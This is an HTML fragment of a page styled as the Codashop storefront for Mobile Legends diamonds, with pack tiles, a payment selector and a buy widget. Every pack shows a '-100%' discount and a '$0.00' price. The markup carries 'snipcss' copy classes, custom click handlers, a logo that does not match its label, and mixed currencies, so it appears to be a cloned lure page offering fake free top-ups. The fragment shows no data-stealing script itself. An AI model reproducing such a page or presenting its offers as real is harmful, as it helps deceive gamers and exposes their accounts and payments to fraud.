<img onerror="this.setAttribute(&#39;data-error&#39;, 1)" alt="1160 Diamonds" loading="lazy" data-nuxt-img srcset="https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/1000_MLBB_NewDemom.png 1x, https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/1000_MLBB_NewDemom.png 2x" src="https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/1000_MLBB_NewDemom.png" data-v-c49af8b5>
</div>
</div>
</div>
<div class="price-section--two-prices price-section" data-testid="sku-item-starting-price-25523" data-v-c49af8b5>
<div class="price-section__price" data-v-c49af8b5>
<span class="price-section__price__prefix" data-v-c49af8b5>From</span>
<div class="price-section__price__price-container" data-v-c49af8b5>
<span class="price-section__price__price-container__amount" data-v-c49af8b5>$0.00</span>
<!---->
</div>
</div>
<div class="price-section__usual-price" data-v-c49af8b5>
<span class="price-section__price__price-container__discount-tag" data-v-c49af8b5>-100% </span>
<span class="price-section__usual-price__amount" data-v-c49af8b5>$21.69</span>
</div>
<span data-v-c49af8b5></span>
</div>
</div>
<!--[-->
<div class="popular-tag" data-v-c49af8b5 data-v-1f90c381>
<span class="popular-tag__shimmer" data-v-1f90c381></span>
<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="popular-tag__icon" data-v-1f90c381>
<path d="M12 12.8999L9.87 14.9899C9.31 15.5499 9 16.2799 9 17.0599C9 18.6799 10.35 19.9999 12 19.9999C13.65 19.9999 15 18.6799 15 17.0599C15 16.2799 14.69 15.5399 14.13 14.9899L12 12.8999Z" fill="#F6F5FC"></path>
<path d="M16 6L15.56 6.55C14.38 8.02 12 7.19 12 5.3V2C12 2 4 6 4 13C4 15.92 5.56 18.47 7.89 19.86C7.33 19.07 7 18.1 7 17.06C7 15.74 7.52 14.5 8.47 13.56L12 10.1L15.53 13.57C16.48 14.5 17 15.74 17 17.07C17 18.09 16.69 19.03 16.15 19.82C18.04 18.67 19.44 16.76 19.86 14.52C20.52 10.97 18.79 7.62 16 6Z" fill="#F6F5FC"></path>
</svg>
<span class="popular-tag__text" data-v-1f90c381>POPULAR</span>
</div>
<!--]-->
</div>
</div>
<div id="headlessui-radiogroup-option-v-0-2-6" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state data-v-546825a6>
<div id="sku-item-tile-25524" class="sku-card" data-testid="sku-item-tile-25524" data-auto-capture="skuClick" onclick="chooseSku(event, 'denom7');" capture-custom-sku-id="25524" capture-custom-sku-name="1770 Diamonds" data-v-546825a6 data-v-c49af8b5>
<div class="sku-card__inner-container" data-v-c49af8b5>
<div class="sku-info-section" data-v-c49af8b5>
<div class="sku-info-section__titles" data-v-c49af8b5>
<div class="sku-info-section__titles__title" data-v-c49af8b5>
<span data-v-c49af8b5>1770 Diamonds</span>
<!---->
</div>
<!---->
</div>
<div class="sku-info-section__images" data-v-c49af8b5>
<div class="sku-info-section__images__icon" data-v-c49af8b5>
<img onerror="this.setAttribute(&#39;data-error&#39;, 1)" alt="1770 Diamonds" loading="lazy" data-nuxt-img srcset="https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/1500_MLBB_NewDemom.png 1x, https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/1500_MLBB_NewDemom.png 2x" src="https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/1500_MLBB_NewDemom.png" data-v-c49af8b5>
</div>
</div>
</div>
<div class="price-section" data-testid="sku-item-starting-price-25524" data-v-c49af8b5>
<div class="price-section__price" data-v-c49af8b5>
<span class="price-section__price__prefix" data-v-c49af8b5>From</span>
<div class="price-section__price__price-container" data-v-c49af8b5>
<span class="price-section__price__price-container__amount" data-v-c49af8b5>$0.00</span>
<!---->
</div>
</div>
<div class="price-section__usual-price" data-v-c49af8b5>
<span class="price-section__price__price-container__discount-tag" data-v-c49af8b5>-100% </span>
<span class="price-section__usual-price__amount" data-v-c49af8b5>$29.99</span>
</div>
<span data-v-c49af8b5></span>
</div>
</div>
<!--[-->
<!---->
<!--]-->
</div>
</div>
<div id="headlessui-radiogroup-option-v-0-2-7" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state data-v-546825a6>
<div id="sku-item-tile-25525" class="sku-card" data-testid="sku-item-tile-25525" data-auto-capture="skuClick" onclick="chooseSku(event, 'denom8');" capture-custom-sku-id="25525" capture-custom-sku-name="2975 Diamonds" data-v-546825a6 data-v-c49af8b5>
<div class="sku-card__inner-container" data-v-c49af8b5>
<div class="sku-info-section" data-v-c49af8b5>
<div class="sku-info-section__titles" data-v-c49af8b5>
<div class="sku-info-section__titles__title" data-v-c49af8b5>
<span data-v-c49af8b5>2975 Diamonds</span>
<!---->
</div>
<!---->
</div>
<div class="sku-info-section__images" data-v-c49af8b5>
<div class="sku-info-section__images__icon" data-v-c49af8b5>
<img onerror="this.setAttribute(&#39;data-error&#39;, 1)" alt="2975 Diamonds" loading="lazy" data-nuxt-img srcset="https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/2500_MLBB_NewDemom.png 1x, https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/2500_MLBB_NewDemom.png 2x" src="https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/2500_MLBB_NewDemom.png" data-v-c49af8b5>
</div>
</div>
</div>
<div class="price-section--two-prices price-section" data-testid="sku-item-starting-price-25525" data-v-c49af8b5>
<div class="price-section__price" data-v-c49af8b5>
<span class="price-section__price__prefix" data-v-c49af8b5>From</span>
<div class="price-section__price__price-container" data-v-c49af8b5>
<span class="price-section__price__price-container__amount" data-v-c49af8b5>$0.00</span>
<!---->
</div>
</div>
<div class="price-section__usual-price" data-v-c49af8b5>
<span class="price-section__price__price-container__discount-tag" data-v-c49af8b5>-100% </span>
<span class="price-section__usual-price__amount" data-v-c49af8b5>$51.17</span>
</div>
<span data-v-c49af8b5></span>
</div>
</div>
<!--[-->
<!---->
<!--]-->
</div>
</div>
<div id="headlessui-radiogroup-option-v-0-2-8" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state data-v-546825a6>
<div id="sku-item-tile-25526" class="sku-card" data-testid="sku-item-tile-25526" data-auto-capture="skuClick" onclick="chooseSku(event, 'denom9');" capture-custom-sku-id="25526" capture-custom-sku-name="4165 Diamonds" data-v-546825a6 data-v-c49af8b5>
<div class="sku-card__inner-container" data-v-c49af8b5>
<div class="sku-info-section" data-v-c49af8b5>
<div class="sku-info-section__titles" data-v-c49af8b5>
<div class="sku-info-section__titles__title" data-v-c49af8b5>
<span data-v-c49af8b5>4165 Diamonds</span>
<!---->
</div>
<!---->
</div>
<div class="sku-info-section__images" data-v-c49af8b5>
<div class="sku-info-section__images__icon" data-v-c49af8b5>
<img onerror="this.setAttribute(&#39;data-error&#39;, 1)" alt="4165 Diamonds" loading="lazy" data-nuxt-img srcset="https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/2500_MLBB_NewDemom.png 1x, https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/2500_MLBB_NewDemom.png 2x" src="https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/2500_MLBB_NewDemom.png" data-v-c49af8b5>
</div>
</div>
</div>
<div class="price-section--two-prices price-section" data-testid="sku-item-starting-price-25526" data-v-c49af8b5>
<div class="price-section__price" data-v-c49af8b5>
<span class="price-section__price__prefix" data-v-c49af8b5>From</span>
<div class="price-section__price__price-container" data-v-c49af8b5>
<span class="price-section__price__price-container__amount" data-v-c49af8b5>$0.00</span>
<!---->
</div>
</div>
<div class="price-section__usual-price" data-v-c49af8b5>
<span class="price-section__price__price-container__discount-tag" data-v-c49af8b5>-100% </span>
<span class="price-section__usual-price__amount" data-v-c49af8b5>$92.88</span>
</div>
<span data-v-c49af8b5></span>
</div>
</div>
<!--[-->
<!---->
<!--]-->
</div>
</div>
<div id="headlessui-radiogroup-option-v-0-2-9" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state data-v-546825a6>
<div id="sku-item-tile-25527" class="sku-card" data-testid="sku-item-tile-25527" data-auto-capture="skuClick" onclick="chooseSku(event, 'denom10');" capture-custom-sku-id="25527" capture-custom-sku-name="6000 Diamonds" data-v-546825a6 data-v-c49af8b5>
<div class="sku-card--popular sku-card__inner-container" data-v-c49af8b5>
<div class="sku-info-section" data-v-c49af8b5>
<div class="sku-info-section__titles" data-v-c49af8b5>
<div class="sku-info-section__titles__title" data-v-c49af8b5>
<span data-v-c49af8b5>6000 Diamonds</span>
<!---->
</div>
<!---->
</div>
<div class="sku-info-section__images" data-v-c49af8b5>
<div class="sku-info-section__images__icon" data-v-c49af8b5>
<img onerror="this.setAttribute(&#39;data-error&#39;, 1)" alt="6000 Diamonds" loading="lazy" data-nuxt-img srcset="https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/5000_MLBB_NewDemom.png 1x, https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/5000_MLBB_NewDemom.png 2x" src="https://cdn1.codashop.com/S/content/common/images/denom-image/MLBB/150x150/5000_MLBB_NewDemom.png" data-v-c49af8b5>
</div>
</div>
</div>
<div class="price-section--two-prices price-section" data-testid="sku-item-starting-price-25527" data-v-c49af8b5>
<div class="price-section__price" data-v-c49af8b5>
<span class="price-section__price__prefix" data-v-c49af8b5>From</span>
<div class="price-section__price__price-container" data-v-c49af8b5>
<span class="price-section__price__price-container__amount" data-v-c49af8b5>$0.00</span>
<!---->
</div>
</div>
<div class="price-section__usual-price" data-v-c49af8b5>
<span class="price-section__price__price-container__discount-tag" data-v-c49af8b5>-100% </span>
<span class="price-section__usual-price__amount" data-v-c49af8b5>$135.60</span>
</div>
<span data-v-c49af8b5></span>
</div>
</div>
<!--[-->
<div class="popular-tag" data-v-c49af8b5 data-v-1f90c381>
<span class="popular-tag__shimmer" data-v-1f90c381></span>
<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="popular-tag__icon" data-v-1f90c381>
<path d="M12 12.8999L9.87 14.9899C9.31 15.5499 9 16.2799 9 17.0599C9 18.6799 10.35 19.9999 12 19.9999C13.65 19.9999 15 18.6799 15 17.0599C15 16.2799 14.69 15.5399 14.13 14.9899L12 12.8999Z" fill="#F6F5FC"></path>
<path d="M16 6L15.56 6.55C14.38 8.02 12 7.19 12 5.3V2C12 2 4 6 4 13C4 15.92 5.56 18.47 7.89 19.86C7.33 19.07 7 18.1 7 17.06C7 15.74 7.52 14.5 8.47 13.56L12 10.1L15.53 13.57C16.48 14.5 17 15.74 17 17.07C17 18.09 16.69 19.03 16.15 19.82C18.04 18.67 19.44 16.76 19.86 14.52C20.52 10.97 18.79 7.62 16 6Z" fill="#F6F5FC"></path>
</svg>
<span class="popular-tag__text" data-v-1f90c381>POPULAR</span>
</div>
<!--]-->
</div>
</div>
<!--]-->
</div>
</section>
<!--]-->
</div>
<!--]-->
<span data-v-546825a6></span>
</div>
<!--]-->
<!--]-->
</div>
</div>

<div id="step-payment-method" class="product__purchase-step__container" data-testid="purchase-step-payment-channels" data-v-f4592d14 data-v-36889fac>
<!---->
<div class="product__purchase-step__heading" data-v-36889fac>
<h2 id="step-payment-method-heading" data-v-36889fac>
<span class="product__purchase-step__icon" data-v-36889fac></span>
<span class="product__purchase-step__title" data-v-36889fac>Select Payment</span>
<!---->
</h2>
</div>
<div class="product__purchase-step__pre-content" data-v-36889fac>
<!--[-->
<span data-v-f4592d14></span>
<!--]-->
</div>
<div class="product__purchase-step__content" data-v-36889fac>
<!--[-->
<span data-v-f4592d14></span>
<!--[-->
<div data-v-070e2611="" class="payment-section snipcss-lGWhw" data-testid="payment-section" id="headlessui-radiogroup-v-0-2-41" role="radiogroup">
<div data-v-dd156f5d="" data-v-070e2611="" class="payment-method" data-testid="payment-section-item-906" capture-custom-pc-id="906" data-auto-capture="pcClick" id="headlessui-radiogroup-option-v-0-2-44" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state="" onclick="choosePaymentChannel(event, 'paymentChannel_906');">
<section data-v-dd156f5d="" id="paymentChannel_906" class="payment-method__content">
<figure data-v-dd156f5d="" class="payment-method__logo active"><img data-v-dd156f5d="" alt="CODACASH" loading="lazy" data-nuxt-img="" class="payment-method__logo-img" src="https://ph.support.codashop.com/hc/article_attachments/4406220541583/codacash-darkmatter.png">
<div data-v-dd156f5d="" class="payment-method__logo-tagline">CODACASH</div>
</figure>
<section data-v-dd156f5d="" style="display: none;" class="payment-show payment-method__pricing">
<div data-v-dd156f5d="" class="payment-method__pricing__info"><span data-v-dd156f5d="" class="payment-method__price--discount"> -100% </span><span data-v-dd156f5d="" class="payment-method__price--strikethrough">Rp. 2.883</span></div>
<div data-v-dd156f5d="" class="payment-method__price"><span data-v-dd156f5d="">$0.00</span><span data-v-dd156f5d="" class="text-[10px] font-semibold text-gray-400"></span></div><span data-v-86028730="" data-v-dd156f5d="" class="payment-earn-rewards"><span data-v-86028730="">Get 0.5% Rewards</span></span>
</section>
</section>
</div>
<div data-v-dd156f5d="" data-v-070e2611="" class="payment-method" data-testid="payment-section-item-240" capture-custom-pc-id="240" data-auto-capture="pcClick" id="headlessui-radiogroup-option-v-0-2-43" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state="">
<section data-v-dd156f5d="" id="paymentChannel_240" class="payment-method__content">
<figure data-v-dd156f5d="" class="payment-method__logo">
<img data-v-dd156f5d="" alt="QRIS" loading="lazy" data-nuxt-img="" class="payment-method__logo-img" src="https://cdn1.codashop.com/S/content/common/images/mno/CASHAPP_US_CHNL_LOGO.webp">
<div data-v-dd156f5d="" class="payment-method__logo-tagline">Cash App</div>
</figure>
<section data-v-dd156f5d="" style="display: none;" class="payment-show payment-method__pricing__disabled">
<div data-v-dd156f5d="" class="payment-method__pricing__disabled-message">Not available</div>
</section>
</section>
</div>
                                                            
</div>
<!--]-->
<!--]-->
</div>
</div>
<!---->
<!---->
<div data-v-6514a331="" data-v-50ce566c="" class="pixel-container">
<div data-v-6514a331="" id="pcPixel" class="pixel-container__pixel"></div>
</div>
<div data-v-6514a331="" data-v-50ce566c="" class="pixel-container">
<div data-v-6514a331="" id="buyPixel" class="pixel-container__pixel"></div>
</div>
</form>
<span data-v-f4592d14></span>
</div>
</div>
</div>
<div class="product__faq_section snipcss-oB2p7" data-v-f4592d14="">
<div class="product-long-description" data-v-7fb7d351 data-v-c063fa34>
<h1 class="product-long-description__title" data-v-c063fa34>Find the best Mobile Legends top up deals and get up to 2x bonus Diamonds only at Codashop Global </h1>
<div class="product-long-description__content" data-testid="product-long-description" data-v-c063fa34>
<p class="shop-content--paragraph">
Codashop is the safe and easy way to buy official game and app credits. We are trusted by millions of gamers and app users in over 50 countries including Global. <a href="#top">Top up now.</a>
</p>
<p class="shop-content--paragraph">Codashop Global offers Mobile Legends Diamond,  which unlocks access to premium content in the game, bringing your gameplay to the next level!</p>
<p class="shop-content--paragraph">
<strong>Why Choose Codashop for Mobile Legends top up?</strong>
</p>
<p class="shop-content--paragraph">
Quick and Easy<br>It only takes a few seconds to top up MLBB Diamond on Codashop.
</p>
<p class="shop-content--paragraph">
Instant &amp;Secure Delivery<br>Purchases are delivered straight to your in-game account
</p>
<p class="shop-content--paragraph">
Convenient payment methods<br>Pay using the most popular payment methods in Global.
</p>
<p class="shop-content--paragraph">
Speedy &amp;Localized Customer Support<br>
Our support team is always ready to help. Send us a message through this <a href="https://my.support.codashop.com/hc/en-us" target="_blank">form</a>
and we will get back to you ASAP!
</p>
<p class="shop-content--paragraph">
Exciting promotions<br>Never miss out on awesome deals, giveaways, and more only at Codashop!
</p>
<a id="bottom"></a>
</div>
</div>


</div>
<div data-v-716cada4="" data-v-f4592d14="" class="checkout-guide snipcss-NrzGO">
<div data-v-716cada4="" class="checkout-guide-lcol"></div>
<div data-v-716cada4="" class="checkout-guide-rcol">
<div data-v-716cada4="" class="checkout-guide-button" style="">
<div><svg data-v-716cada4="" style="display: none;" width="21" height="20" viewBox="0 0 21 20" fill="none" xmlns="http://www.w3.org/2000/svg" id="checkout-guide-icon-user" class="checkout-guide-icon"><path d="M10.4998 1.66675C5.89984 1.66675 2.1665 5.40008 2.1665 10.0001C2.1665 14.6001 5.89984 18.3334 10.4998 18.3334C15.0998 18.3334 18.8332 14.6001 18.8332 10.0001C18.8332 5.40008 15.0998 1.66675 10.4998 1.66675ZM6.62484 15.4167C7.7165 14.6334 9.04984 14.1667 10.4998 14.1667C11.9498 14.1667 13.2832 14.6334 14.3748 15.4167C13.2832 16.2001 11.9498 16.6667 10.4998 16.6667C9.04984 16.6667 7.7165 16.2001 6.62484 15.4167ZM15.6165 14.2667C14.1568 13.1215 12.3552 12.4991 10.4998 12.4991C8.64452 12.4991 6.84284 13.1215 5.38317 14.2667C4.3806 13.0712 3.83175 11.5604 3.83317 10.0001C3.83317 6.31675 6.8165 3.33341 10.4998 3.33341C14.1832 3.33341 17.1665 6.31675 17.1665 10.0001C17.1665 11.6251 16.5832 13.1084 15.6165 14.2667Z" fill="white"></path><path d="M10.5002 5C8.89183 5 7.5835 6.30833 7.5835 7.91667C7.5835 9.525 8.89183 10.8333 10.5002 10.8333C12.1085 10.8333 13.4168 9.525 13.4168 7.91667C13.4168 6.30833 12.1085 5 10.5002 5ZM10.5002 9.16667C9.8085 9.16667 9.25016 8.60833 9.25016 7.91667C9.25016 7.225 9.8085 6.66667 10.5002 6.66667C11.1918 6.66667 11.7502 7.225 11.7502 7.91667C11.7502 8.60833 11.1918 9.16667 10.5002 9.16667Z" fill="white"></path></svg></div>
<div><svg data-v-716cada4="" style="display: none;" width="21" height="20" viewBox="0 0 21 20" fill="none" xmlns="http://www.w3.org/2000/svg" id="checkout-guide-icon-cart" class="checkout-guide-icon"><path d="M9.66658 7.49992H11.3333V4.99992H13.8333V3.33325H11.3333V0.833252H9.66658V3.33325H7.16658V4.99992H9.66658V7.49992ZM6.33325 14.9999C5.41658 14.9999 4.67492 15.7499 4.67492 16.6666C4.67492 17.5833 5.41658 18.3333 6.33325 18.3333C7.24992 18.3333 7.99992 17.5833 7.99992 16.6666C7.99992 15.7499 7.24992 14.9999 6.33325 14.9999ZM14.6666 14.9999C13.7499 14.9999 13.0083 15.7499 13.0083 16.6666C13.0083 17.5833 13.7499 18.3333 14.6666 18.3333C15.5833 18.3333 16.3333 17.5833 16.3333 16.6666C16.3333 15.7499 15.5833 14.9999 14.6666 14.9999ZM7.24992 10.8333H13.4583C14.0833 10.8333 14.6333 10.4916 14.9166 9.97492L18.1333 4.13325L16.6833 3.33325L13.4583 9.16658H7.60825L4.05825 1.66659H1.33325V3.33325H2.99992L5.99992 9.65825L4.87492 11.6916C4.26659 12.8083 5.06659 14.1666 6.33325 14.1666H16.3333V12.4999H6.33325L7.24992 10.8333Z" fill="white"></path></svg></div>
<div><svg data-v-716cada4="" style="display: none;" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" id="checkout-guide-icon-wallet" class="checkout-guide-icon"><path d="M3 4a1 1 0 0 0-1 1v14a1 1 0 0 0 1 1h18a1 1 0 0 0 1-1V8.5a1 1 0 0 0-1-1h-.8V5a1 1 0 0 0-1-1H3Zm17 7h-4a1 1 0 0 0-.832.445l-1 1.5a1 1 0 0 0 0 1.11l1 1.5A1 1 0 0 0 16 16h4v2H4V6h14.2v1.5H7.7a1 1 0 0 0 0 2H20V11Zm0 3h-3.465l-.333-.5.333-.5H20v1Z"></path></svg></div>
<div data-v-716cada4="" class="checkout-guide-label">
<div data-v-716cada4="" id="guideText">Enter User ID</div>
</div>
<div data-v-e14c7668="" data-v-716cada4="" class="inline-block">
<svg data-v-e14c7668="" width="20" height="20" viewBox="0 0 20 20">
<circle data-v-e14c7668="" cx="10" cy="10" r="9" stroke="#3F3C4D" stroke-width="2" fill="none"></circle>
<circle id="guideProgress" data-v-e14c7668="" cx="10" cy="10" r="9" stroke="#41BE68" stroke-width="2" fill="none" stroke-dasharray="56.548667764616276" stroke-dashoffset="18.548667764616276" stroke-linecap="round" style="transition: stroke-dashoffset 1s;"></circle>
</svg>
</div>
</div>
<div data-v-716cada4="" class="checkout-guide-buy-widget-container snipcss-cNYfB">
<div data-v-8806b75d="" data-v-716cada4="" data-testid="buy-widget" class="buy-widget buy-widget--active" data-auto-capture="buyNowClick" style="">
<div data-v-8806b75d="" class="buy-widget__info snipcss-Lj4cl">
<section data-v-5698702d="" data-v-8806b75d="" class="buy-widget-status-section visible"><span data-v-5698702d="" id="buyProductName">4830 Diamonds</span><span id="buyProductSub" data-v-5698702d="" class="buy-widget-status-subtitle"></span><span data-v-5698702d="" class="round-divider"></span><span data-v-5698702d="" id="buyProductPayment">QRIS</span></section>
<section data-v-8806b75d="" class="buy-widget__info__content">
<section data-v-f12dbf7a="" data-v-8806b75d="" class="buy-widget-price-container visible">
<section data-v-f12dbf7a="" class="buy-widget-strikethrough-section">
<span data-v-f12dbf7a="" class="buy-widget-strikethrough-price" data-testid="buy-widget-strikethrough-price">Rp. 0</span>
</section>
<div data-v-f12dbf7a="" class="buy-widget-price buy-widget-price--highlighted" data-testid="buy-widget-price-amount"><span data-v-f12dbf7a="">$0.00</span></div><span data-v-f12dbf7a="" class="buy-widget-tax-info">Tax will be charged at checkout</span>
</section>
<div data-v-8806b75d="" class="buy-widget__info__content__button"><button data-v-45cd0733="" data-v-8806b75d="" data-variant="success" data-size="medium" data-loading="false" class="button-solid button-solid--with-content button-solid--full-width" id="mdn-submit">
<div data-v-8806b75d="" data-testid="buy-widget-animation"><span data-v-8806b75d="" class="buy-widget__info__content__button__shimmer"></span><span data-v-8806b75d="" class="buy-widget__info__content__button__glow"></span></div><span data-v-45cd0733="" class="button-solid__inner"><span data-v-45cd0733="" class="button-solid__inner__content button-solid__inner__content--icon-prefix"><span data-v-45cd0733="" class="button-solid__inner__content__slot"> Order now</span></span><svg data-v-45cd0733="" class="animate-spin stroke-current button-solid__inner__spinner" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
<g class="origin-center animate-[rotate_2s_linear_infinite]">
<circle class="animate-[circle_1.5s_ease-in-out_infinite]" cx="12" cy="12" r="9.5" fill="none" stroke-width="3" stroke-linecap="round"></circle>
</g>
</svg></span>
</button></div>
</section>
<div data-v-e0def394="" data-v-8806b75d="" class="buy-widget-rewards-tag" data-testid="widget-rewards-tag">
<div data-v-e0def394="" class="buy-widget-rewards-tag__content">
<div data-v-e0def394=""><svg data-v-e0def394="" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="buy-widget-rewards-tag__icon">
<g clip-path="url(#reward_svg__clip0_3_25)">
<mask id="reward_svg__mask0_3_25" maskUnits="userSpaceOnUse" x="0" y="0" width="12" height="12" class="style-zdM51">
<path d="M6.1362 11.9999C9.35956 11.9999 11.9726 9.3869 11.9726 6.16355C11.9726 2.94019 9.35956 0.327148 6.1362 0.327148C2.91285 0.327148 0.299805 2.94019 0.299805 6.16355C0.299805 9.3869 2.91285 11.9999 6.1362 11.9999Z" fill="white"></path>
</mask>
<g mask="url(#reward_svg__mask0_3_25)">
<path d="M6.1362 11.9999C9.35956 11.9999 11.9726 9.3869 11.9726 6.16355C11.9726 2.94019 9.35956 0.327148 6.1362 0.327148C2.91285 0.327148 0.299805 2.94019 0.299805 6.16355C0.299805 9.3869 2.91285 11.9999 6.1362 11.9999Z" fill="#8E4616"></path>
</g>
<mask id="reward_svg__mask1_3_25" maskUnits="userSpaceOnUse" x="0" y="0" width="12" height="12" class="style-dopw5">
<path d="M6.2885 11.3836C9.43201 11.3836 11.9803 8.83533 11.9803 5.69182C11.9803 2.54831 9.43201 0 6.2885 0C3.14499 0 0.59668 2.54831 0.59668 5.69182C0.59668 8.83533 3.14499 11.3836 6.2885 11.3836Z" fill="white"></path>
</mask>
<g mask="url(#reward_svg__mask1_3_25)">
<path d="M6.2885 11.3836C9.43201 11.3836 11.9803 8.83533 11.9803 5.69182C11.9803 2.54831 9.43201 0 6.2885 0C3.14499 0 0.59668 2.54831 0.59668 5.69182C0.59668 8.83533 3.14499 11.3836 6.2885 11.3836Z" fill="#FCCB3F"></path>
</g>
<mask id="reward_svg__mask2_3_25" maskUnits="userSpaceOnUse" x="3" y="2" width="7" height="7" class="style-LQA8b">
<path d="M6.25799 8.8878C7.95161 8.8878 9.32457 7.51485 9.32457 5.82122C9.32457 4.12759 7.95161 2.75464 6.25799 2.75464C4.56436 2.75464 3.19141 4.12759 3.19141 5.82122C3.19141 7.51485 4.56436 8.8878 6.25799 8.8878Z" fill="white"></path>
</mask>
<g mask="url(#reward_svg__mask2_3_25)">
<path d="M6.25799 8.8878C7.95161 8.8878 9.32457 7.51485 9.32457 5.82122C9.32457 4.12759 7.95161 2.75464 6.25799 2.75464C4.56436 2.75464 3.19141 4.12759 3.19141 5.82122C3.19141 7.51485 4.56436 8.8878 6.25799 8.8878Z" fill="#FFF6A1"></path>
</g>
<mask id="reward_svg__mask3_3_25" maskUnits="userSpaceOnUse" x="4" y="2" width="4" height="8" class="style-tRrdw">
<path d="M7.75746 6.97773C7.75746 5.43303 5.68771 5.61565 5.68771 4.70252C5.68771 4.31445 5.93882 4.09377 6.34973 4.09377C6.61605 4.09377 6.8139 4.17748 7.01174 4.32205C7.1411 4.41337 7.31612 4.39815 7.42265 4.28401L7.48352 4.21552C7.59767 4.08616 7.58245 3.88832 7.44548 3.78179C7.20959 3.58394 6.92804 3.44698 6.5704 3.40132C6.5704 3.39371 6.5704 3.3861 6.5704 3.37849V2.94476C6.5704 2.77735 6.43343 2.64038 6.26602 2.64038C6.09862 2.64038 5.96165 2.77735 5.96165 2.94476V3.37849C5.96165 3.37849 5.96165 3.40132 5.96165 3.41654C5.26919 3.53829 4.82785 4.04051 4.82785 4.75579C4.82785 6.18635 6.8976 6.04178 6.8976 7.05382C6.8976 7.46473 6.66171 7.70823 6.15949 7.70823C5.8399 7.70823 5.55074 7.59409 5.26919 7.41147C5.13222 7.32015 4.94199 7.3582 4.85068 7.49517L4.78219 7.59409C4.69088 7.73106 4.72893 7.92129 4.8659 8.01261C5.18549 8.22567 5.58118 8.37025 5.94643 8.40829V8.86486C5.94643 9.03226 6.0834 9.16923 6.2508 9.16923C6.41821 9.16923 6.55518 9.03226 6.55518 8.86486V8.38547C7.30851 8.2485 7.73463 7.71584 7.73463 6.99295L7.75746 6.97773Z" fill="white"></path>
</mask>
<g mask="url(#reward_svg__mask3_3_25)">
<path d="M7.75746 6.97773C7.75746 5.43303 5.68771 5.61565 5.68771 4.70252C5.68771 4.31445 5.93882 4.09377 6.34973 4.09377C6.61605 4.09377 6.8139 4.17748 7.01174 4.32205C7.1411 4.41337 7.31612 4.39815 7.42265 4.28401L7.48352 4.21552C7.59767 4.08616 7.58245 3.88832 7.44548 3.78179C7.20959 3.58394 6.92804 3.44698 6.5704 3.40132C6.5704 3.39371 6.5704 3.3861 6.5704 3.37849V2.94476C6.5704 2.77735 6.43343 2.64038 6.26602 2.64038C6.09862 2.64038 5.96165 2.77735 5.96165 2.94476V3.37849C5.96165 3.37849 5.96165 3.40132 5.96165 3.41654C5.26919 3.53829 4.82785 4.04051 4.82785 4.75579C4.82785 6.18635 6.8976 6.04178 6.8976 7.05382C6.8976 7.46473 6.66171 7.70823 6.15949 7.70823C5.8399 7.70823 5.55074 7.59409 5.26919 7.41147C5.13222 7.32015 4.94199 7.3582 4.85068 7.49517L4.78219 7.59409C4.69088 7.73106 4.72893 7.92129 4.8659 8.01261C5.18549 8.22567 5.58118 8.37025 5.94643 8.40829V8.86486C5.94643 9.03226 6.0834 9.16923 6.2508 9.16923C6.41821 9.16923 6.55518 9.03226 6.55518 8.86486V8.38547C7.30851 8.2485 7.73463 7.71584 7.73463 6.99295L7.75746 6.97773Z" fill="#BC6422"></path>
<path d="M7.65883 7.11469C7.65883 5.56999 5.58908 5.75261 5.58908 4.83949C5.58908 4.45141 5.84019 4.23074 6.25109 4.23074C6.51742 4.23074 6.71527 4.31444 6.91311 4.45902C7.04247 4.55033 7.21748 4.53511 7.32402 4.42097L7.38489 4.35249C7.49903 4.22313 7.48381 4.02528 7.34684 3.91875C7.11095 3.72091 6.82941 3.58394 6.47177 3.53828C6.47177 3.53067 6.47177 3.52306 6.47177 3.51545V3.08172C6.47177 2.91431 6.3348 2.77734 6.16739 2.77734C5.99998 2.77734 5.86301 2.91431 5.86301 3.08172V3.51545C5.86301 3.51545 5.86301 3.53828 5.86301 3.5535C5.17056 3.67525 4.72922 4.17747 4.72922 4.89275C4.72922 6.32332 6.79897 6.17874 6.79897 7.19079C6.79897 7.60169 6.56308 7.84519 6.06086 7.84519C5.74126 7.84519 5.45211 7.73105 5.17056 7.54843C5.03359 7.45711 4.84336 7.49516 4.75204 7.63213L4.68356 7.73105C4.59225 7.86802 4.63029 8.05826 4.76726 8.14957C5.08686 8.36263 5.48255 8.50721 5.8478 8.54526V9.00182C5.8478 9.16923 5.98476 9.3062 6.15217 9.3062C6.31958 9.3062 6.45655 9.16923 6.45655 9.00182V8.52243C7.20988 8.38546 7.636 7.8528 7.636 7.12991L7.65883 7.11469Z" fill="#68250E"></path>
<path d="M6.54777 8.59103L6.47168 8.50733L6.57821 8.37036L6.74562 8.59103H6.54777Z" fill="#BC6422"></path>
<path d="M5.7793 3.40129L5.87061 3.53826L5.97714 3.4089L5.80213 3.37085L5.7793 3.40129Z" fill="#BC6422"></path>
</g>
<mask id="reward_svg__mask4_3_25" maskUnits="userSpaceOnUse" x="1" y="1" width="11" height="10" class="style-MdKX4">
